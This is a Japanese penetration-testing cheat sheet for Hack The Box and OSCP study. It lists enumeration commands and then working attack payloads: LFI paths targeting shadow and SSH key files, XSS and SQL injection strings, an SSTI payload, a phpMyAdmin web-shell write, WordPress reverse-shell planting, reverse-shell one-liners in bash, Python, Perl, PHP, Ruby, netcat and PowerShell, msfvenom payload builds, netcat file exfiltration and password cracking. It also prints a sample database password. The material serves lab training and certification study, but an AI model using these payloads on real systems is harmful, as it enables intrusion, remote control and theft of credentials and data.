# ペネトレーションテスト用チートシート
Hack The Boxの攻略やOSCPの取得を目指して、まとめているチートシートです。  
随時更新して成長していきます。

# Enum
## Nmap
```
kali@kali:$ sudo nmap -sC -sV -oN nmap/initial 10.10.10.1
```
```
kali@kali:$ sudo nmap -T5 -p- -oN nmap/full 10.10.10.1
```
```
kali@kali:~$ sudo nmap --script vuln 10.10.10.1
```
```
kali@kali:$ nmap --script http-enum 10.10.10.1 -p 80
PORT   STATE SERVICE
80/tcp open  http
| http-enum:
|   /admin/: Possible admin folder
|   /admin/index.html: Possible admin folder
|   /wp-login.php: Possible admin folder
|   /robots.txt: Robots file
|   /feed/: Wordpress version: 4.3.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.
```
- -sS...ステルス/SYNスキャン
- -sT...TCPコネクトスキャン
- -sU...UDPスキャン
- -sn...ネットワークスイープ
- -A...OSのバージョン検出
- -sC...--script=defaultの意味
- -sV...特定のポートで動作しているサービスを識別
- --script=...様々なスクリプトの使用
  - dns-zone-transfer
  - smb-os-discovery
  - http-enum
  - vuln
- -O...OSフィンガープリンティング(ターゲットのOS判別)
- -v...詳細の出力
- -oG...grep可能なファイル形式に出力
- --top-ports...優先度の高い順にポートを検出(/usr/share/nmap/nmap-servicesに依存)

## Masscan
Massscanはインターネット全体を約6分でスキャンし、1秒間に1000万パケットという驚異的な数のパケットを送信する最速のポートスキャナー。  
raw socketsの権限を必要とするためsudoを用いる。　　
下記のコマンドではTCPポート80が空いているホストをclass Aサブネットで列挙している。
```
kali@kali:~$ sudo masscan -p80 10.0.0.0/8
```

## FTP(21)
```
ログインユーザの指定...user (ユーザ名) (パスワード)
ファイル転送モードを指定...type (転送モード)
```
|  コマンド  |  説明  |
| ---- | ---- |
|  USER (username)<br>PASS (password)  |  ログイン情報の記述。  |
|  get (リモートファイル名) (ローカルファイル名)  |  	サーバのファイルをパソコンに転送。  |
|  mget (リモートファイル名 [...])  |  サーバの複数のファイルをパソコンに転送。 |
|  mput (ローカルファイル名 [...])  |  パソコンの複数のファイルをサーバに転送。 |
|  put (ローカルファイル名) (リモートファイル名)  | パソコンのファイルをサーバに転送。 |
|  type (転送モード)  |  	現在のファイル転送モードを表示。  |

## SSH(22)
### SCP
カレントディレクトリにsecret.zipをダウンロード
```
kali@kali:$ scp charix@10.10.10.84:/home/charix/secret.zip .
```

### SSHポートフォワーディング
#### ローカルポートフォワーディング
対象マシンの特定のポートで作動しているサービスをlocalhostでアクセスできるようにする。  
相手のsshサーバから自分のローカルホストへ引き寄せる。  
コマンドは自分のホストで発行。
```
kali@kali:$ ssh -L 8000:127.0.0.1:8000 charix@10.10.10.84
```
- -L...[相手の動作しているポート番号(対象マシン):ローカルホストアドレス(自分のマシン):ローカルで展開するポート番号(自分のマシン)]

#### リモートポートフォワーディング
対象マシンの特定のポートで作動しているサービスをlocalhostでアクセスできるようにする。  
自分のsshサーバへ飛ばす。  
コマンドは相手のホストで発行。
```
kali@kali:~$ sudo systemctl start ssh
```
```
ssh -R 8888:127.0.0.1:8888 kali@10.10.14.11
plink.exe -R 8888:127.0.0.1:8888 -l kali -pw kali 10.10.14.11
```
- -R...[相手の動作しているポート番号(自分のマシン):ローカルホストアドレス(対象マシン):サービスが展開されているポート(対象マシン)]

### ssh-keygen
```
ssh-keygen -t rsa -f id_rsa
chmod 600 id_rsa
```
- -t...暗号の種類(ed25519,rsaなど)
- -b...ビット数の固定(-t rsa -b 4096など)
- -f...ファイル名(id_????の?部分)

### 公開鍵認証方式でsshログイン
```
cat id_rsa.pub >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```
```
ssh -i id_rsa root@10.10.10.1
```

### id_rsaのクラック
```
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```
```
┌──(kali㉿kali)-[~/htb/boxes/Valentine]
└─$ openssl rsa -in id_rsa -out decrypt_id_rsa                                                                                                                                      1 ⨯
Enter pass phrase for test:<input key>
writing RSA key
```

## SMTP(25)
```
telnet 10.10.10.1 25
```
メールの送信:
```
MAIL FROM: <送信元のメールアドレス>
RCPT TO: <送信先のメールアドレス>
DATA
<送信内容の記述>
QUIT
```
```
nmap -p 25 --script smtp-commands 10.10.10.10
```
|  コマンド  |  動作  |
| ---- | ---- |
|  VERY  |  サーバに電子メールアドレスの確認を要求　 |
|  EXPN  |  サーバにメーリングリストの資格を要求  |

## DNS(53)
- -NS(ネームサーバーレコード)...ドメインのDNSレコードをホストする権威サーバーの名前が含まれる
- -A(ホストレコード)...ホスト名のIPアドレスが含まれている
- -MX(mail Exchangeレコード)...ドメインの電子メール処理を担当するサーバーの名前が含まれている
- -PTR(ポインタレコード)...逆引きで使用されIPアドレスに関連するレコードを見つけるために使用される
- -TXT(テキストレコード)...テキストレコードは任意のデータを含むことができ、ドメインの所有権確認などを行える

hostコマンドはデフォルトではAレコードを検索するが、-tオプションをつけることで、その他のレコードを検索することも可能。
```
kali@kali:~$ host -t txt megacorpone.com
```

### ドメイン名の特定
DNSサーバー = 10.10.10.13  
ドメイン名を調べたいIPアドレス = 10.10.10.13  
10.10.10.13 = ns1.cronos.htb
```
┌──(kali㉿kali)-[~]
└─$ nslookup
> server 10.10.10.13　# DNSサーバーの指定
Default server: 10.10.10.13
Address: 10.10.10.13#53
> 10.10.10.13　# ドメイン名を知りたいIPアドレスの指定
13.10.10.10.in-addr.arpa        name = ns1.cronos.htb.
```

### サブドメインの列挙
#### DNSゾーン転送
権威DNSサーバの設定不備によってゾーン情報を取得できることがある。  
これによりサーバーの名前、アドレス、機能などを調べることができる。
```
dig axfr cronos.htb @10.10.10.13
```
```
host -l <domain name> <dns server address>
```

#### DNSRecon
DNS列挙スクリプト。  
サブドメインの列挙。(ゾーン転送とブルートフォース)
```
1.kali@kali:~$ dnsrecon -d megacorpone.com -t axfr
2.kali@kali:~$ dnsrecon -d megacorpone.com -D ~/list.txt -t brt
```
- -d...ドメイン名の指定
- -t...実行する列挙の種類(1つ目はゾーン転送)
- -t...実行する列挙の種類(2つ目はブルートフォース)
- -D...サブドメイン文字列を含むワードリストファイルの指定

#### DNSmap
サブドメインの列挙。(ブルートフォース)
```
┌──(root💀kali)-[/home/kali/htb/boxes/Cronos]
└─# dnsmap cronos.htb -w /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt                                                                127 ⨯
dnsmap 0.35 - DNS Network Mapper

[+] searching (sub)domains for cronos.htb using /usr/share/seclists/Discovery/DNS/shubs-subdomains.txt
[+] using maximum random delay of 10 millisecond(s) between requests

www.cronos.htb
IP address #1: 10.10.10.13
[+] warning: internal IP address disclosed

admin.cronos.htb
IP address #1: 10.10.10.13
[+] warning: internal IP address disclosed
```

#### DNSenum
DNSReconとは異なった出力をするDNS列挙ツール。
```
kali@kali:~$ dnsenum zonetransfer.me
```

## HTTP(80)
### チェック項目
- robots.txt，sitemap.xmlの確認
- サブドメインの列挙
- ディレクトリスキャナーの使用
- CMSの特定
- ログインの試行
  - デフォルトパスワードの入力
  - パスワード推測
  - SQLインジェクションの試行
  - Webサイト上にある情報からユーザー/パスワードリストの作成
  - ブルートフォース
- BurpSuiteを用いてWebの挙動の確認
- URLを見て、LFIの脆弱性が無いか確認
- upload機構がある場合、バイパス方法の模索
- 掲載されている画像にヒントが無いか確認


### robots.txt，sitemap.xmlの確認
```
curl http://<IPアドレス>/robots.txt
curl http://<IPアドレス>/sitemap.xml
```

### /etc/hostsファイルの編集
```
sudo emacs /etc/hosts
10.10.10.1  admin.htb
```

### サブドメインの列挙
#### Gobuster(DNSモード)
DNSサブドメインのブルートフォース。  
-dオプションで指定したドメインのサブドメインを見つけるために使用する。
```
gobuster dns -d test.com -w subdomains-top1mil-5000.txt -i
```
- -d...ドメイン名の指定
- -i...IPアドレスの表示

#### Gobuster(Vhostモード)
組織が複数のドメイン名を1代のサーバーでホストしている仮想ホストを見つけることが可能。
```
gobuster vhost -u http://10.10.10.1/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-11000.txt
```

### ffuf
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1mil-5000.txt -u http://website.com/ -H “Host: FUZZ.website.com”
*単語の量でフィルタリング
ffuf -w sublists.txt -u http://website.com/ -H “Host: FUZZ.website.com” -fw 3913
```
- -fw...単語の量でフィルタリング
- -fl...行数でフィルタリング
- -fs...応答のサイズでフィルタリング
- -fc...ステータスコードでフィルタリング
- -fr...正規表現のパターンでフィルタリング

### サブディレクトリの列挙
#### dirb
```
dirb http://website.com -r -z 10
```
- -r...非再帰的にスキャン
- -z...各リクエストに10ミリ秒の遅延を加える

#### Gobuster
```
gobuster dir -t 50 -u <url>  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,py -o <output filename> -k
```
-dir...ディレクトリ総当たり
- -t...スレッド数
- -u...URL指定
- -w...wordlistの指定
- -o...ファイル出力
- -x...拡張子指定
- -k...Skip SSL
- -s...ステータスコードの指定

#### ffuf
```
Directory Fuzzing:
ffuf -c -w /path/to/wordlist -u http://test.com/FUZZ -v
Output File:
ffuf -c -w /path/to/wordlist -u http://test.com/FUZZ -e .php,txt -v > output.txt
```
- -c...出力をカラーにする
- -w...wordlistの指定
- -u...ターゲットURLの指定
- -e...拡張子の指定(.php,.txt,.aspx)
- --recursion...再帰的スキャン
- -v...冗長な出力
- -o...結果をファイルに出力

### Nikto
```
nikto -h <url> -Format txt -o <output filename>
```
- -h...url指定
- -t...スキャンのチューニング
- -Format...出力するファイルの拡張子を指定
- -o...ファイルへ出力する
- -ssl...SSLを使用するサイトで使用
- -maxtime=30s...指定された時間後にスキャンを停止

### WPScan
パッシブスキャン
```
wpscan --update
wpscan --url <url> -e vp #脆弱なプラグイン特定
wpscan --url <url> -e vt #脆弱なTheme特定
wpscan --url <url> -e u #ユーザの列挙
wpscan --url <url> -e u -t -vp --log <output filename>
```
アグレッシブスキャン
```
wpscan --url <url> -e vp --plugins-detection aggressive
```
- -url...対象のURL指定
- -e u...usernameの列挙
- -t...テーマを列挙
- -vp...脆弱性のあるプラグインを列挙
- --log...ファイル出力

#### リスト型攻撃/パスワード推測攻撃
```
wpscan --url <url> -U <ユーザ名> -P <辞書ファイル> --password-attack <攻撃タイプ>
#攻撃タイプ：wp-login,xmlrpc,xmlrpc-multicall
```
- --force...「but does not seem to be running WordPress」などが出た際に警告を無視して強制的に実行する

### BurpSuite
ローカルプロキシツール。  
通信の改ざんをするために使用。  
他にもXSSやSQLインジェクションなどの脆弱性を発見するために使う。  
LFIなどを利用する時にも使用。  

![](./image/2021-05-06-17-25-26.png)

#### Intruder
診断したいパラメータ部分に、自動で挿入を行ってくれる。  
これを利用することで、Repeterを用いた手動による検査ではなく、SQLインジェクションなどを自動化することが可能。  
また、ログインページのブルートフォースなどにも使用可能。


#### Repeater
HTTPリクエストをBurpから直接送信することで、繰り返しHTTPリクエストを送信することが可能。  
この機能を用いて、ログインフォームやOSコマンドインジェクションが疑われる箇所に対して、効率よく様々なスクリプトを挿入可能。

#### Do intercept(Response to this request)
HTTPレスポンスの改ざんが可能。  
これを利用することで、ステータスコード「302 Found」などで目的のページにたどり着く前に移動させられる際に、「200 Found」に変更してやることで目的のページへたどり着くことが可能。

### LFI
```
http://<url>/script.php?page=../../../../../../../../etc/passwd
http://<url>/script.php?page=../../../../../../../../etc/hosts
```

Examples: 
```
http://example.com/index.php?page=etc/passwd
http://example.com/index.php?page=etc/passwd%00
http://example.com/index.php?page=../../etc/passwd
http://example.com/index.php?page=%252e%252e%252f
http://example.com/index.php?page=....//....//etc/passwd
```

LFIを利用して読み取りを狙うファイル:  
* Linux
```
/etc/passwd
/etc/shadow
/etc/issue
/etc/group
/etc/hostname
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/root/.ssh/id_rsa
/root/.ssh/authorized_keys
/home/user/.ssh/authorized_keys
/home/user/.ssh/id_rsa
```

* Windows
```
/boot.ini
/autoexec.bat
/windows/system32/drivers/etc/hosts
/windows/repair/S
```
### XSS(クロスサイトスクリプティング)
```
<script>alert(1);</script>
"><script>alert(1);</script>
<a onmouseover="alert(document.cookie)">XSS</a>
<iframe src="javascript:alert('XSS');"></iframe>
<IMG SRC=j&#X41vascript:alert('XSS')>
```

### SQLインジェクション
・後ろのスペースを入れて使用
```
admin' --
admin' #
admin'/*
' or 1=1--
' or 1=1#
' or 1=1/*
') or ('1'='1--
'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
```

SQLmap:
```
sqlmap -u http://192.168.56.1/vuln.php?id=1
sqlmap -u http：//192.168.0.1/vuln.php?id=1 --user-agent "Mozilla / 5.0（X11; Linux x86_64; rv：60.0 ）Gecko / 20100101 Firefox / 60.0 "
```

### SSTI(サーバサイドテンプレートインジェクション)
![](./image/2021-04-14-15-23-34.png)

・Jinja2(Reverse Shell)
```
{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen("python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"ip\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/cat\", \"flag.txt\"]);'").read().zfill(417)}}{%endif%}{% endfor %}
```

### CMS
- CMSの特定後、ログインページについて調査
- その後、まずはデフォルトパスワードを入力
- 次にSQLインジェクションを試す
- サーバ内で見つけたものなどを用いて、パスワード推測
- 最終的にHydraなどでブルートフォース

#### WordPress
```
ログイン後、
1.[Appearance]→[Editor]→[404 Template(404.php)]を選択して編集
2.PentestMonkeyのphp-reverse-shellをコピーして上書き
3.netcatでリバースシェルを待ち受け
4.下記のようなアドレスにアクセス
  http://192.168.1.101/wordpress/wp-content/themes/twentyfifteen/404.php
```

#### drupal
```
MySQLに接続するための認証情報が記述されている
/var/www/html/sites/default/settings.php

$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);
```

### phpMyAdmin
MySQLサーバをWebブラウザで管理するためのデータベース接続ツール。  
SQL文を記述することなく、MySQLの操作が行える。  
Wordpressのデータベースを管理できる場合、パスワードの変更などが可能。(MD5)
phpMyAdminの設定次第ではSQLタブ内に、下記のようなWebshellを埋め込むことが可能。
```
SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {​​system($_GET[\'cmd\']);}​​ ?> </pre></BODY></HTML>"

INTO OUTFILE '/var/www/phpMyAdmin/cmd.php'
```
```
http://test.com/phpMyAdmin/cmd.php?cmd=ls
```

### exiftool
・画像情報の表示
```
exiftool image.jpg
```

・画像ファイルにexiftoolを用いてコメントにリバースシェルペイロードを記述
```
exiftool -Comment=’<?php echo “<pre>”; system($_GET[‘cmd’]); ?>’ image.png
```

### steghide
・ステガノグラフィー
```
steghide extract -sf image.jpg
```

### binwalk
ファームウェアイメージを解析して抽出するツール。
```
binwalk -Me image.png
```
- -e...既知のファイルタイプを自動的に抽出
- -M...抽出されたファイルを再起的にスキャン

## POP3(110)
```
telnet 10.10.10.1 110
```
|  コマンド  |  動作  |
| ---- | ---- |
|  user <ユーザ名>  |  ユーザ名の入力  |
|  pass <パスワード>  |  パスワードの入力  |
|  stat  |  受信メールの件数を表示  |
|  list  |  受信メールの一覧を表示  |
|  retr <メール番号>  |  listコマンドで表示された番号を指定してメールを読む  |
|  dele <メール番号>  |  listコマンドで表示された番号を指定してメールを削除  |
|  quit  |  接続を終了  |

## NFS{RPCbind,Portmapper}(111)
Network File System(NFS)はクライアントコンピュータのユーザがあたかもローカルにマウントされたストレージ上にあるかのようにファイルにアクセスすることを可能にする。  
NFSはUNIX系OSで使用されることが多く、その実装は安全ではない。  
NFSで使用されるRPCbindとPortmapperはともにTCPポート111で動作する。
```
kali@kali:~$ nmap -v -p 111 10.10.10.1
```
```
kali@kali:~$ nmap -sV -p 111 --script=rpcinfo 10.10.10.1
```

NFSが動作していることが分かった場合/usr/share/nmap/scriptsにあるNSEスクリプトを使用して、サービスの列挙や追加サービスの発見を行うことができる。「*」を使用することで、まとめて使用することができる。
```
kali@kali:~$ ls -1 /usr/share/nmap/scripts/nfs*
/usr/share/nmap/scripts/nfs-ls.nse
/usr/share/nmap/scripts/nfs-showmount.nse
/usr/share/nmap/scripts/nfs-statfs.nse

kali@kali:~$ nmap -p 111 --script nfs* 10.11.1.72
```

### NFSのマウント
mountコマンドを使用することでファイルのアクセスできるようになる。  
オプション-o nolockでファイルロックを無効にする。
```
kali@kali:~$ mkdir test
kali@kali:~$ sudo mount -o nolock 10.10.10.1:/home ~/test/
kali@kali:~$ cd test/ && ls
jenny joe45 john marcus ryuu
```

## SMB(139,445)
### smbclient
匿名ログインが有効になっているかの確認。
```
smbclient -L 10.10.10.1
smbclient //10.10.10.1/tmp
smbclient //10.10.10.1/tmp -U <user>
```

### impacket
ネットワークプロトコルを操作するためにPythonクラスのコレクション。  
SMB1-3やMSRPCなどのプロトコル実装自体を提供することに重点を置いている。  
ツールを利用する以外にもよくexploitに使われているので、インストールしておく必要がある。
```
git clone https://github.com/SecureAuthCorp/impacket.git
pip install .
```
#### impacket-smbclient
```
/usr/share/doc/python3-impacket/examples/smbclient.py username@10.10.10.1
```

#### impacket-smbserver
対象サーバにツールを送り込む際に使用。  
主にnetcatもpowershellも使えないようなときに使う。  
```
python3 /usr/share/doc/python3-impacket/examples/smbserver.py temp
```
```
C:\WINDOWS\system32>\\<smbserverを立ち上げたIPアドレス>\temp\whoami.exe
```

#### RPCclient
```
rpcclient -U "" -N 10.10.10.1
```

#### CrackMapExec
```
crackmapexec smb -L 
crackmapexec 10.10.10.1 -u Administrator -H [hash] --local-auth
crackmapexec 10.10.10.1 -u Administrator -H [hash] --share
crackmapexec smb 10.10.10.1/24 -u user -p 'Password' --local-auth -M mimikatz
```

### nmap-smb
```
nmap --script smb-* -p 139,445, 10.10.10.1
nmap --script smb-enum-* -p 139,445, 10.10.10.1
```

#### Nmap NSE ScriptsによるSMBの列挙
Nmap NES Scriptsのディレクトリ(SMB):
```
/usr/share/nmap/scripts
```
SMBによるOSの検出や列挙(smb-os-discovery):
```
kali@kali:~$ nmap -v -p 139, 445 --script=smb-os-discovery 10.11.1.227
```
SMBプロトコルの既知の脆弱性をチェックする場合:  
(unsafe=1にした場合、脆弱なシステムをクラッシュさせてしまう可能性があるので、本番システムをスキャンする場合は注意)
```
kali@kali:~$ nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1 10.10.10.1
```

### smbmap
ドメイン全体のsamba共有ドライブを列挙するために使用。
```
smbmap -u <user> -p <password> -H 10.10.10.1
smbmap -H 10.10.10.1 -d <domain> -u <user> -p <password>
```

### enum4linux
WindowsおよびSambaホストからのデータを列挙するためのツール。
```
enum4linux -U -o <target ip>
```
- -U...ユーザリスト取得
- -o...OS情報取得

### NetBIOS(139)
NetBIOSはローカルネットワーク上のコンピュータが相互に通信できるようにするセッション層のプロトコルである。  
最近のSMBの実装ではNetBIOSがなくても動作するが、NetBIOS over TCP(NBT)は後方互換性のために必要で、ともに有効になっている場合が多い。このt前、2つのサービスの列挙は一緒に行われる。
```
kali@kali:~$ nmap -v -p 139,445 -oG result.txt 10.10.10.1
```
#### nbtscan
NetBIOS情報を特定するための専門的ツール。オプション-rを使用することで発信元のUDPポートを137に指定している。
```
kali@kali:~$ sudo nbtscan -r 10.11.1.0/24
```
## SNMP(161)
SNMPはルータ、スイッチ、サーバなどのTCP/IPネットワークに接続された通信機器に対して、ネットワーク経由で監視、制御するためのUDPベースのアプリケーション層プロトコル。  
SNMP1,2,2cではトラフィックの暗号化が行われていないため、SNMP情報や認証情報をローカルネットワーク上で傍受することができてしまう。  
MIBはネットワーク管理に関連する情報を含むデータベースのことでツリー上になっている。
その下にSNMPコミュニティと呼ばれるSNMPで管理するネットワークシステムの範囲を定めたものがある。
```
kali@kali:~$ sudo nmap -sU --open -p 161 10.11.1.1-254 -oG open-snmp.txt
```

### Windows SNMPの列挙
#### MIBツリーの列挙
```
kali@kali:~$ snmpwalk -c public -v1 -t 10 10.10.10.1
iso.3.6.1.2.1.1.1.0 = STRING: "Hardware: x86 Family 6 Model 12 Stepping 2 AT/AT COMPAT
IBLE - Software: Windows 2000 Version 5.1 (Build 2600 Uniprocessor Free)"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.311.1.1.3.1.1
iso.3.6.1.2.1.1.3.0 = Timeticks: (2005539644) 232 days, 2:56:36.44
iso.3.6.1.2.1.1.4.0 = ""
```
- -c...コミュニティ文字列を指定
- -v...SNMPバージョン番号の指定
- -t...タイムアウト期間の設定

#### Windowsユーザーの列挙
```
kali@kali:~$ snmpwalk -c public -v1 10.10.10.1 1.3.6.1.4.1.77.1.2.25
iso.3.6.1.4.1.77.1.2.25.1.1.3.98.111.98 = STRING: "bob"
iso.3.6.1.4.1.77.1.2.25.1.1.5.71.117.101.115.116 = STRING: "Guest"
iso.3.6.1.4.1.77.1.2.25.1.1.8.73.85.83.82.95.66.79.66 = STRING: "IUSR_BOB"
```

#### 実行中のWindowsプロセス列挙n
```
kali@kali:~$ snmpwalk -c public -v1 10.10.10.1 1.3.6.1.2.1.25.4.2.1.2
iso.3.6.1.2.1.25.4.2.1.2.1 = STRING: "System Idle Process"
iso.3.6.1.2.1.25.4.2.1.2.4 = STRING: "System"
iso.3.6.1.2.1.25.4.2.1.2.224 = STRING: "smss.exe"
iso.3.6.1.2.1.25.4.2.1.2.324 = STRING: "csrss.exe"
iso.3.6.1.2.1.25.4.2.1.2.364 = STRING: "wininit.exe"
iso.3.6.1.2.1.25.4.2.1.2.372 = STRING: "csrss.exe"
iso.3.6.1.2.1.25.4.2.1.2.420 = STRING: "winlogon.exe"
```

#### TCPポートの列挙
```
kali@kali:~$ snmpwalk -c public -v1 10.11.1.14 1.3.6.1.2.1.6.13.1.3
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.21.0.0.0.0.18646 = INTEGER: 21
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.80.0.0.0.0.45310 = INTEGER: 80
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.135.0.0.0.0.24806 = INTEGER: 135
iso.3.6.1.2.1.6.13.1.3.0.0.0.0.443.0.0.0.0.45070 = INTEGER: 443
```

#### インストールされているソフトウェアの列挙
```
kali@kali:~$ snmpwalk -c public -v1 10.11.1.50 1.3.6.1.2.1.25.6.3.1.2
iso.3.6.1.2.1.25.6.3.1.2.1 = STRING: "LiveUpdate 3.3 (Symantec Corporation)"
iso.3.6.1.2.1.25.6.3.1.2.2 = STRING: "WampServer 2.5"
iso.3.6.1.2.1.25.6.3.1.2.3 = STRING: "VMware Tools"
iso.3.6.1.2.1.25.6.3.1.2.4 = STRING: "Microsoft Visual C++ 2008 Redistributable - x86
9.0.30729.4148"
iso.3.6.1.2.1.25.6.3.1.2.5 = STRING: "Microsoft Visual C++ 2012 Redistributable (x86)
```

## MySQL(3306)
ログイン
```
mysql -u root -p
mysql -u root -p -h <host name> -P <port number>
mysql -u root -e 'SHOW DATABASES;'
```
- -D...データベース名の指定
- -e...コマンドラインから直接SQLコマンドを実行
- -h... ホスト名の指定
- -p...パスワードの指定
- -u...ユーザー名の指定

*データベース一覧の表示
```
mysql > show databases;
```

*データベースの追加
```
mysql > create database sample_db;
```

*テーブル一覧の表示
```
mysql > show tables;
```

*全レコードを選択
```
SELECT * FROM <テーブル名>;
```

*テーブル構造の確認(フィールドを整理して表示してくれるため、下記のユーザ情報取得をすると見やすい)
```
describe <テーブル名>;
```

*ユーザ情報取得
```
SELECT Host, User, Password FROM <テーブル名>;
```

*ユーザの追加
```
create user <追加するusername>@<host name> IDENTIFIED BY <password>;
```

*権限付与
```
grant all privileges on test_db.* to <username>@<host name> IDENTIFIED BY <password>;
```

## Redis(6379)
[]

# Exploitation
## Reverse Shell
Bash:
```
bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
```

Python:  
```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.9",9004))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
```

Perl:
```
perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

PHP:
```
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
<?php echo system($_REQUEST ["cmd"]); ?>
```

Ruby:
```
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

Netcat:
```
nc -e /bin/sh 10.0.0.1 1234
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
```

PowerShell:
```
C:\Users\offsec> powershell -c "$client = New-Object System.Net.Sockets.TCPClient('10.
11.0.4',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i =
$stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.T
ext.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII
).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$c
lient.Close()"
```

## msfvenom
- -p...使用するpayloadの指定
- -f...出力フォーマット
- -a...使用するアーキテクチャ
- -e...エンコーディングの指定(x86/shikata_ga_nai，x64/zutto_dekiru)
- -i...エンコードする回数
- --platform...プラットフォームの選択(windows，Linux)
- -o...ファイルの出力
  
Windows
```
msfvenom -p windows/shell_reverse_tcp lhost=10.0.0.1 lport=4444 –f exe > reverse.exe
```

Windows(meterpreter):
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=thread -f exe -a x86 --platform windows -o reverse.exe
```

Linux:
```
msfvenom -p linux/x64/shell_reverse_tcp RHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
```
Linux(meterpreter):
```
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
```

PHP:
```
msfvenom -p php/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port Number> -f raw > reverse.php
```

ASP:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f asp > reverse.asp
```

JSP:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.jsp
```

WAR:
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<ip address> LPORT=<Port Number> -f war > reverse.war
```

Python:
```
msfvenom -p cmd/unix/reverse_python LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.py
```

Bash:
```
msfvenom -p cmd/unix/reverse_bash LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.sh
```

Perl:
```
msfvenom -p cmd/unix/reverse_perl LHOST=<ip address> LPORT=<Port Number> -f raw > reverse.pl
```

### Handlers(meterpreter)
```
use exploit/multi/handler
set payload <payload>
set LHOST <ip address>
set LPORT <port number>
run
```

## HttpServer
・攻撃者マシンでのサーバ立ち上げ。
```
sudo systemctl start apache2
python -m SimpleHTTPServer 9001
python3 -m http.server 9001
php -S 0.0.0.0:9001
ruby -run -e httpd . -p 9001
busybox httpd -f -p 9001
```

## Netcat
・ファイル転送  
```
送信側
nc <攻撃者のIPアドレス> 9999 < filename

受信側
nc -l -p 9999 > filename
```

## searchsploit
Exploit-dbを即座に検索できるツール。
```
searchsploit <keyword>
```

ターミナル上でコードを閲覧。
```
searchsploit - searchsploit -m windows/remote/39161.py
```

ローカルにコードやテキストをダウンロード。  
これでexploit用スクリプトをダウンロードする。
```
searchsploit -m searchsploit -m windows/remote/39161.py
```

## tcpdump
```
sudo tcpdump -i tun0 icmp
```

## John The Ripper
### zip
```
zip2john a.zip > hash.txt
john hash.txt 
or
john --wordlist=/usr/share/wordlist/rockyou.txt hash.txt
```

### ssh
```
ssh2john id_rsa > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
john --show hash.txt
```

### md5
```
john --wordlist=/usr/share/wordlist/rockyou.txt --format=Raw-MD5 hash.txt
```

### 同じファイルをクラックした時に出るエラー
```
┌──(kali㉿kali)-[~/htb/boxes/Delivery]
└─$ john --wordlist=/usr/share/wordlist/rockyou.txt hash
